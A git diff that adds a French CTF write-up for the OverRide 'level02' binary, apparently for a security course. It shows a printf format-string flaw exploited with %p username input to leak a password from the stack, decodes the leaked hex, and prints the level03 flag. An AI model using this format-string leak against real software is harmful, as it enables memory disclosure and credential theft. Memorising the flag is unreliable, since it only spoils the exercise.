@@ -1,3 +1,85 @@
-AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+# Level02
 
-%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d
+En examinant le binaire en utilisant la commande file on voit que le binaire est en ELF 64-bit:
+
+```
+level02@OverRide:~$ file level02
+level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
+```
+
+Quand on execute le binaire donner on nous demande un username puis un mot de passe:
+
+```
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: 
+--[ Password:
+```
+
+D'abord on peu voir que le programme ouvre le fichier .pass du user level03 et lie son contenue pour le stocker dans un buffer.
+
+En analysant le code (voir fichier source) on remarque qu'il n'y a aucun checks realiser sur le username saisi.
+
+Par contre le mot de passe saisi est comparer a celui qui a ete lu dans le fichier .pass.
+
+Si les 2 mots de passes sont pareils alors le programme nous ouvre un systeme /bin/sh.
+
+D'ailleurs le strncmp compare les 41 premiers caracteres:
+
+```
+iVar1 = strncmp((char *)local_a8,(char *)local_118,0x29);
+```
+0x29 = 41 en decimal.
+On peu donc partir du principe que le mot de passe fait 40 caracteres (+1 pour le \0).
+
+A la fin du programme on remarque un printf qui contient une vulnerabilite de format.
+
+```
+  printf((char *)local_78);
+```
+
+local_78 represente le buffer ou on stock ce qu'on tqpe dans username.
+
+On peut maintenant afficher les adresses qui sont sur la stack pour essayer de trouver le mot de passe qui est stocker dans un buffer:
+
+```
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+--[ Password: *****************************************
+0x7fffffffe4f0.(nil).0x25.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70.0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70. does not have access!
+```
+
+On remarque qu'apres le premier (nil) les adresses ont l'air de ressembler a de l'ascii.
+On prend donc les valeurs du premier 9nil0 jusqu au deuxieme et on va les reverses puisqu'elle dans la stack elles sont sous la forme little-endian. Et on va les concatener pour recuperer le mot de passe final:
+
+```
+level02@OverRide:~$ python -c 'print "\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1]'
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+Maintenant qu'on a notre mot de passe on peut maintenant tester:
+
+```
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: hack
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, hack!
+$ cd ../level03
+$ cat .pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+$
+```
+
+Hop ! Direction le level03 :D
